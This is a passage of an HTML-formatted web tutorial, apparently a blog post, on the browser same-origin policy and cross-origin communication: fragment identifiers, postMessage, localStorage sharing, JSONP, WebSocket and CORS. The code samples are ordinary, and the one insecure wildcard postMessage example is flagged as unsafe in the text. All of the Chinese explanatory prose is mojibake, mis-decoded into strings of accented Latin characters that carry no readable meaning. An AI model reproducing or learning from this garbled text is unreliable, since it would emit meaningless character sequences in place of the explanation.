<p>åä¹‹äº¦ç„¶ï¼Œå­çª—å£è·å–ä¸»çª—å£çš„ DOM ä¹Ÿä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.parent.document.body</span><br><span class="line">&#x2F;&#x2F; æŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>è¿™ç§æƒ…å†µä¸ä»…é€‚ç”¨äº<code>iframe</code>çª—å£ï¼Œè¿˜é€‚ç”¨äº<code>window.open</code>æ–¹æ³•æ‰“å¼€çš„çª—å£ï¼Œåªè¦è·¨åŸŸï¼Œçˆ¶çª—å£ä¸å­çª—å£ä¹‹é—´å°±æ— æ³•é€šä¿¡ã€‚</p>
<p>å¦‚æœä¸¤ä¸ªçª—å£ä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯äºŒçº§åŸŸåä¸åŒï¼Œé‚£ä¹ˆè®¾ç½®ä¸Šä¸€èŠ‚ä»‹ç»çš„<code>document.domain</code>å±æ€§ï¼Œå°±å¯ä»¥è§„é¿åŒæºæ”¿ç­–ï¼Œæ‹¿åˆ° DOMã€‚</p>
<p>å¯¹äºå®Œå…¨ä¸åŒæºçš„ç½‘ç«™ï¼Œç›®å‰æœ‰ä¸¤ç§æ–¹æ³•ï¼Œå¯ä»¥è§£å†³è·¨åŸŸçª—å£çš„é€šä¿¡é—®é¢˜ã€‚</p>
<blockquote>
<ul>
<li>ç‰‡æ®µè¯†åˆ«ç¬¦ï¼ˆfragment identifierï¼‰</li>
<li>è·¨æ–‡æ¡£é€šä¿¡APIï¼ˆCross-document messagingï¼‰</li>
</ul>
</blockquote>
<h4 id="ç‰‡æ®µè¯†åˆ«ç¬¦"><a href="#ç‰‡æ®µè¯†åˆ«ç¬¦" class="headerlink" title="ç‰‡æ®µè¯†åˆ«ç¬¦"></a>ç‰‡æ®µè¯†åˆ«ç¬¦</h4><p>ç‰‡æ®µæ ‡è¯†ç¬¦ï¼ˆfragment identifierï¼‰æŒ‡çš„æ˜¯ï¼ŒURL çš„<code>#</code>å·åé¢çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚<code>http://example.com/x.html#fragment</code>çš„<code>#fragment</code>ã€‚å¦‚æœåªæ˜¯æ”¹å˜ç‰‡æ®µæ ‡è¯†ç¬¦ï¼Œé¡µé¢ä¸ä¼šé‡æ–°åˆ·æ–°ã€‚</p>
<p>çˆ¶çª—å£å¯ä»¥æŠŠä¿¡æ¯ï¼Œå†™å…¥å­çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var src &#x3D; originURL + &#39;#&#39; + data;</span><br><span class="line">document.getElementById(&#39;myIFrame&#39;).src &#x3D; src;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œçˆ¶çª—å£æŠŠæ‰€è¦ä¼ é€’çš„ä¿¡æ¯ï¼Œå†™å…¥ iframe çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p>
<p>å­çª—å£é€šè¿‡ç›‘å¬<code>hashchange</code>äº‹ä»¶å¾—åˆ°é€šçŸ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.onhashchange &#x3D; checkMessage;</span><br><span class="line"></span><br><span class="line">function checkMessage() &#123;</span><br><span class="line">  var message &#x3D; window.location.hash;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œå­çª—å£ä¹Ÿå¯ä»¥æ”¹å˜çˆ¶çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.location.href &#x3D; target + &#39;#&#39; + hash;</span><br></pre></td></tr></table></figure>

<h4 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage()"></a>window.postMessage()</h4><p>ä¸Šé¢çš„è¿™ç§æ–¹æ³•å±äºç ´è§£ï¼ŒHTML5 ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº†ä¸€ä¸ªå…¨æ–°çš„APIï¼šè·¨æ–‡æ¡£é€šä¿¡ APIï¼ˆCross-document messagingï¼‰ã€‚</p>
<p>è¿™ä¸ª API ä¸º<code>window</code>å¯¹è±¡æ–°å¢äº†ä¸€ä¸ª<code>window.postMessage</code>æ–¹æ³•ï¼Œå…è®¸è·¨çª—å£é€šä¿¡ï¼Œä¸è®ºè¿™ä¸¤ä¸ªçª—å£æ˜¯å¦åŒæºã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œçˆ¶çª—å£<code>aaa.com</code>å‘å­çª—å£<code>bbb.com</code>å‘æ¶ˆæ¯ï¼Œè°ƒç”¨<code>postMessage</code>æ–¹æ³•å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; çˆ¶çª—å£æ‰“å¼€ä¸€ä¸ªå­çª—å£</span><br><span class="line">var popup &#x3D; window.open(&#39;http:&#x2F;&#x2F;bbb.com&#39;, &#39;title&#39;);</span><br><span class="line">&#x2F;&#x2F; çˆ¶çª—å£å‘å­çª—å£å‘æ¶ˆæ¯</span><br><span class="line">popup.postMessage(&#39;Hello World!&#39;, &#39;http:&#x2F;&#x2F;bbb.com&#39;);</span><br></pre></td></tr></table></figure>

<p><code>postMessage</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…·ä½“çš„ä¿¡æ¯å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¥æ”¶æ¶ˆæ¯çš„çª—å£çš„æºï¼ˆoriginï¼‰ï¼Œå³â€œåè®® + åŸŸå + ç«¯å£â€ã€‚ä¹Ÿå¯ä»¥è®¾ä¸º<code>*</code>ï¼Œè¡¨ç¤ºä¸é™åˆ¶åŸŸåï¼Œå‘æ‰€æœ‰çª—å£å‘é€ã€‚</p>
<p>å­çª—å£å‘çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„å†™æ³•ç±»ä¼¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; å­çª—å£å‘çˆ¶çª—å£å‘æ¶ˆæ¯</span><br><span class="line">window.opener.postMessage(&#39;Nice to see you&#39;, &#39;http:&#x2F;&#x2F;aaa.com&#39;);</span><br></pre></td></tr></table></figure>

<p>çˆ¶çª—å£å’Œå­çª—å£éƒ½å¯ä»¥é€šè¿‡<code>message</code>äº‹ä»¶ï¼Œç›‘å¬å¯¹æ–¹çš„æ¶ˆæ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; çˆ¶çª—å£å’Œå­çª—å£éƒ½å¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç ï¼Œ</span><br><span class="line">&#x2F;&#x2F; ç›‘å¬ message æ¶ˆæ¯</span><br><span class="line">window.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  console.log(e.data);</span><br><span class="line">&#125;,false);</span><br></pre></td></tr></table></figure>

<p><code>message</code>äº‹ä»¶çš„å‚æ•°æ˜¯äº‹ä»¶å¯¹è±¡<code>event</code>ï¼Œæä¾›ä»¥ä¸‹ä¸‰ä¸ªå±æ€§ã€‚</p>
<blockquote>
<ul>
<li><code>event.source</code>ï¼šå‘é€æ¶ˆæ¯çš„çª—å£</li>
<li><code>event.origin</code>: æ¶ˆæ¯å‘å‘çš„ç½‘å€</li>
<li><code>event.data</code>: æ¶ˆæ¯å†…å®¹</li>
</ul>
</blockquote>
<p>ä¸‹é¢çš„ä¾‹å­æ˜¯ï¼Œå­çª—å£é€šè¿‡<code>event.source</code>å±æ€§å¼•ç”¨çˆ¶çª—å£ï¼Œç„¶åå‘é€æ¶ˆæ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;message&#39;, receiveMessage);</span><br><span class="line">function receiveMessage(event) &#123;</span><br><span class="line">  event.source.postMessage(&#39;Nice to see you!&#39;, &#39;*&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ<code>receiveMessage</code>å‡½æ•°é‡Œé¢æ²¡æœ‰è¿‡æ»¤ä¿¡æ¯çš„æ¥æºï¼Œä»»æ„ç½‘å€å‘æ¥çš„ä¿¡æ¯éƒ½ä¼šè¢«å¤„ç†ã€‚å…¶æ¬¡ï¼Œ<code>postMessage</code>æ–¹æ³•ä¸­æŒ‡å®šçš„ç›®æ ‡çª—å£çš„ç½‘å€æ˜¯ä¸€ä¸ªæ˜Ÿå·ï¼Œè¡¨ç¤ºè¯¥ä¿¡æ¯å¯ä»¥å‘ä»»æ„ç½‘å€å‘é€ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™ä¸¤ç§åšæ³•æ˜¯ä¸æ¨èçš„ï¼Œå› ä¸ºä¸å¤Ÿå®‰å…¨ï¼Œå¯èƒ½ä¼šè¢«æ¶æ„åˆ©ç”¨ã€‚</p>
<p><code>event.origin</code>å±æ€§å¯ä»¥è¿‡æ»¤ä¸æ˜¯å‘ç»™æœ¬çª—å£çš„æ¶ˆæ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;message&#39;, receiveMessage);</span><br><span class="line">function receiveMessage(event) &#123;</span><br><span class="line">  if (event.origin !&#x3D;&#x3D; &#39;http:&#x2F;&#x2F;aaa.com&#39;) return;</span><br><span class="line">  if (event.data &#x3D;&#x3D;&#x3D; &#39;Hello World&#39;) &#123;</span><br><span class="line">    event.source.postMessage(&#39;Hello&#39;, event.origin);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(event.data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h4><p>é€šè¿‡<code>window.postMessage</code>ï¼Œè¯»å†™å…¶ä»–çª—å£çš„ LocalStorage ä¹Ÿæˆä¸ºäº†å¯èƒ½ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œä¸»çª—å£å†™å…¥ iframe å­çª—å£çš„<code>localStorage</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.onmessage &#x3D; function(e) &#123;</span><br><span class="line">  if (e.origin !&#x3D;&#x3D; &#39;http:&#x2F;&#x2F;bbb.com&#39;) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  var payload &#x3D; JSON.parse(e.data);</span><br><span class="line">  localStorage.setItem(payload.key, JSON.stringify(payload.data));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£å°†çˆ¶çª—å£å‘æ¥çš„æ¶ˆæ¯ï¼Œå†™å…¥è‡ªå·±çš„ LocalStorageã€‚</p>
<p>çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var win &#x3D; document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;</span><br><span class="line">var obj &#x3D; &#123; name: &#39;Jack&#39; &#125;;</span><br><span class="line">win.postMessage(</span><br><span class="line">  JSON.stringify(&#123;key: &#39;storage&#39;, data: obj&#125;),</span><br><span class="line">  &#39;http:&#x2F;&#x2F;bbb.com&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>åŠ å¼ºç‰ˆçš„å­çª—å£æ¥æ”¶æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">window.onmessage &#x3D; function(e) &#123;</span><br><span class="line">  if (e.origin !&#x3D;&#x3D; &#39;http:&#x2F;&#x2F;bbb.com&#39;) return;</span><br><span class="line">  var payload &#x3D; JSON.parse(e.data);</span><br><span class="line">  switch (payload.method) &#123;</span><br><span class="line">    case &#39;set&#39;:</span><br><span class="line">      localStorage.setItem(payload.key, JSON.stringify(payload.data));</span><br><span class="line">      break;</span><br><span class="line">    case &#39;get&#39;:</span><br><span class="line">      var parent &#x3D; window.parent;</span><br><span class="line">      var data &#x3D; localStorage.getItem(payload.key);</span><br><span class="line">      parent.postMessage(data, &#39;http:&#x2F;&#x2F;aaa.com&#39;);</span><br><span class="line">      break;</span><br><span class="line">    case &#39;remove&#39;:</span><br><span class="line">      localStorage.removeItem(payload.key);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åŠ å¼ºç‰ˆçš„çˆ¶çª—å£å‘é€æ¶ˆæ¯ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var win &#x3D; document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;</span><br><span class="line">var obj &#x3D; &#123; name: &#39;Jack&#39; &#125;;</span><br><span class="line">&#x2F;&#x2F; å­˜å…¥å¯¹è±¡</span><br><span class="line">win.postMessage(</span><br><span class="line">  JSON.stringify(&#123;key: &#39;storage&#39;, method: &#39;set&#39;, data: obj&#125;),</span><br><span class="line">  &#39;http:&#x2F;&#x2F;bbb.com&#39;</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F; è¯»å–å¯¹è±¡</span><br><span class="line">win.postMessage(</span><br><span class="line">  JSON.stringify(&#123;key: &#39;storage&#39;, method: &quot;get&quot;&#125;),</span><br><span class="line">  &quot;*&quot;</span><br><span class="line">);</span><br><span class="line">window.onmessage &#x3D; function(e) &#123;</span><br><span class="line">  if (e.origin !&#x3D; &#39;http:&#x2F;&#x2F;aaa.com&#39;) return;</span><br><span class="line">  console.log(JSON.parse(e.data).name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h3><p>åŒæºæ”¿ç­–è§„å®šï¼ŒAJAX è¯·æ±‚åªèƒ½å‘ç»™åŒæºçš„ç½‘å€ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚</p>
<p>é™¤äº†æ¶è®¾æœåŠ¡å™¨ä»£ç†ï¼ˆæµè§ˆå™¨è¯·æ±‚åŒæºæœåŠ¡å™¨ï¼Œå†ç”±åè€…è¯·æ±‚å¤–éƒ¨æœåŠ¡ï¼‰ï¼Œæœ‰ä¸‰ç§æ–¹æ³•è§„é¿è¿™ä¸ªé™åˆ¶ã€‚</p>
<blockquote>
<ul>
<li>JSONP</li>
<li>WebSocket</li>
<li>CORS</li>
</ul>
</blockquote>
<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>JSONP æ˜¯æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯è·¨æºé€šä¿¡çš„å¸¸ç”¨æ–¹æ³•ã€‚æœ€å¤§ç‰¹ç‚¹å°±æ˜¯ç®€å•æ˜“ç”¨ï¼Œæ²¡æœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œè€å¼æµè§ˆå™¨å…¨éƒ¨æ”¯æŒï¼ŒæœåŠ¡ç«¯æ”¹é€ éå¸¸å°ã€‚</p>
<p>å®ƒçš„åšæ³•å¦‚ä¸‹ã€‚</p>
<p>ç¬¬ä¸€æ­¥ï¼Œç½‘é¡µæ·»åŠ ä¸€ä¸ª<code>&lt;script&gt;</code>å…ƒç´ ï¼Œå‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªè„šæœ¬ï¼Œè¿™ä¸å—åŒæºæ”¿ç­–é™åˆ¶ï¼Œå¯ä»¥è·¨åŸŸè¯·æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;api.foo.com?callback&#x3D;bar&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¯·æ±‚çš„è„šæœ¬ç½‘å€æœ‰ä¸€ä¸ª<code>callback</code>å‚æ•°ï¼ˆ<code>?callback=bar</code>ï¼‰ï¼Œç”¨æ¥å‘Šè¯‰æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯çš„å›è°ƒå‡½æ•°åç§°ï¼ˆ<code>bar</code>ï¼‰ã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œæ‹¼æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°† JSON æ•°æ®æ”¾åœ¨å‡½æ•°åé‡Œé¢ï¼Œä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼ˆ<code>bar({...})</code>ï¼‰ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼Œå®¢æˆ·ç«¯ä¼šå°†æœåŠ¡å™¨è¿”å›çš„å­—ç¬¦ä¸²ï¼Œä½œä¸ºä»£ç è§£æï¼Œå› ä¸ºæµè§ˆå™¨è®¤ä¸ºï¼Œè¿™æ˜¯<code>&lt;script&gt;</code>æ ‡ç­¾è¯·æ±‚çš„è„šæœ¬å†…å®¹ã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯åªè¦å®šä¹‰äº†<code>bar()</code>å‡½æ•°ï¼Œå°±èƒ½åœ¨è¯¥å‡½æ•°ä½“å†…ï¼Œæ‹¿åˆ°æœåŠ¡å™¨è¿”å›çš„ JSON æ•°æ®ã€‚</p>
<p>ä¸‹é¢çœ‹ä¸€ä¸ªå®ä¾‹ã€‚é¦–å…ˆï¼Œç½‘é¡µåŠ¨æ€æ’å…¥<code>&lt;script&gt;</code>å…ƒç´ ï¼Œç”±å®ƒå‘è·¨åŸŸç½‘å€å‘å‡ºè¯·æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function addScriptTag(src) &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.setAttribute(&#39;type&#39;, &#39;text&#x2F;javascript&#39;);</span><br><span class="line">  script.src &#x3D; src;</span><br><span class="line">  document.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.onload &#x3D; function () &#123;</span><br><span class="line">  addScriptTag(&#39;http:&#x2F;&#x2F;example.com&#x2F;ip?callback&#x3D;foo&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function foo(data) &#123;</span><br><span class="line">  console.log(&#39;Your public IP address is: &#39; + data.ip);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç é€šè¿‡åŠ¨æ€æ·»åŠ <code>&lt;script&gt;</code>å…ƒç´ ï¼Œå‘æœåŠ¡å™¨<code>example.com</code>å‘å‡ºè¯·æ±‚ã€‚æ³¨æ„ï¼Œè¯¥è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸€ä¸ª<code>callback</code>å‚æ•°ï¼Œç”¨æ¥æŒ‡å®šå›è°ƒå‡½æ•°çš„åå­—ï¼Œè¿™å¯¹äº JSONP æ˜¯å¿…éœ€çš„ã€‚</p>
<p>æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ä»¥åï¼Œä¼šå°†æ•°æ®æ”¾åœ¨å›è°ƒå‡½æ•°çš„å‚æ•°ä½ç½®è¿”å›ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  &#39;ip&#39;: &#39;8.8.8.8&#39;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>&lt;script&gt;</code>å…ƒç´ è¯·æ±‚çš„è„šæœ¬ï¼Œç›´æ¥ä½œä¸ºä»£ç è¿è¡Œã€‚è¿™æ—¶ï¼Œåªè¦æµè§ˆå™¨å®šä¹‰äº†<code>foo</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°å°±ä¼šç«‹å³è°ƒç”¨ã€‚ä½œä¸ºå‚æ•°çš„ JSON æ•°æ®è¢«è§†ä¸º JavaScript å¯¹è±¡ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤é¿å…äº†ä½¿ç”¨<code>JSON.parse</code>çš„æ­¥éª¤ã€‚</p>
<h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4><p>WebSocket æ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½¿ç”¨<code>ws://</code>ï¼ˆéåŠ å¯†ï¼‰å’Œ<code>wss://</code>ï¼ˆåŠ å¯†ï¼‰ä½œä¸ºåè®®å‰ç¼€ã€‚è¯¥åè®®ä¸å®è¡ŒåŒæºæ”¿ç­–ï¼Œåªè¦æœåŠ¡å™¨æ”¯æŒï¼Œå°±å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œè·¨æºé€šä¿¡ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘å‡ºçš„ WebSocket è¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ˆæ‘˜è‡ª<a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a>ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw&#x3D;&#x3D;</span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Origin: http:&#x2F;&#x2F;example.com</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæœ‰ä¸€ä¸ªå­—æ®µæ˜¯<code>Origin</code>ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚çš„è¯·æ±‚æºï¼ˆoriginï¼‰ï¼Œå³å‘è‡ªå“ªä¸ªåŸŸåã€‚</p>
<p>æ­£æ˜¯å› ä¸ºæœ‰äº†<code>Origin</code>è¿™ä¸ªå­—æ®µï¼Œæ‰€ä»¥ WebSocket æ‰æ²¡æœ‰å®è¡ŒåŒæºæ”¿ç­–ã€‚å› ä¸ºæœåŠ¡å™¨å¯ä»¥æ ¹æ®è¿™ä¸ªå­—æ®µï¼Œåˆ¤æ–­æ˜¯å¦è®¸å¯æœ¬æ¬¡é€šä¿¡ã€‚å¦‚æœè¯¥åŸŸååœ¨ç™½åå•å†…ï¼ŒæœåŠ¡å™¨å°±ä¼šåšå‡ºå¦‚ä¸‹å›åº”ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk&#x3D;</span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure>

<h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>CORS æ˜¯è·¨æºèµ„æºåˆ†äº«ï¼ˆCross-Origin Resource Sharingï¼‰çš„ç¼©å†™ã€‚å®ƒæ˜¯ W3C æ ‡å‡†ï¼Œå±äºè·¨æº AJAX è¯·æ±‚çš„æ ¹æœ¬è§£å†³æ–¹æ³•ã€‚ç›¸æ¯” JSONP åªèƒ½å‘<code>GET</code>è¯·æ±‚ï¼ŒCORS å…è®¸ä»»ä½•ç±»å‹çš„è¯·æ±‚ã€‚</p>
<h2 id="CORS-é€šä¿¡"><a href="#CORS-é€šä¿¡" class="headerlink" title="CORS é€šä¿¡"></a>CORS é€šä¿¡</h2><p>CORS æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå…¨ç§°æ˜¯â€œè·¨åŸŸèµ„æºå…±äº«â€ï¼ˆCross-origin resource sharingï¼‰ã€‚å®ƒå…è®¸æµè§ˆå™¨å‘è·¨åŸŸçš„æœåŠ¡å™¨ï¼Œå‘å‡º<code>XMLHttpRequest</code>è¯·æ±‚ï¼Œä»è€Œå…‹æœäº† AJAX åªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ã€‚</p>
<h3 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ã€‚</p>
<p>æ•´ä¸ª CORS é€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORS é€šä¿¡ä¸æ™®é€šçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç° AJAX è¯·æ±‚è·¨åŸŸï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„ŸçŸ¥ã€‚å› æ­¤ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº† CORS æ¥å£ï¼Œå°±å¯ä»¥è·¨åŸŸé€šä¿¡ã€‚</p>
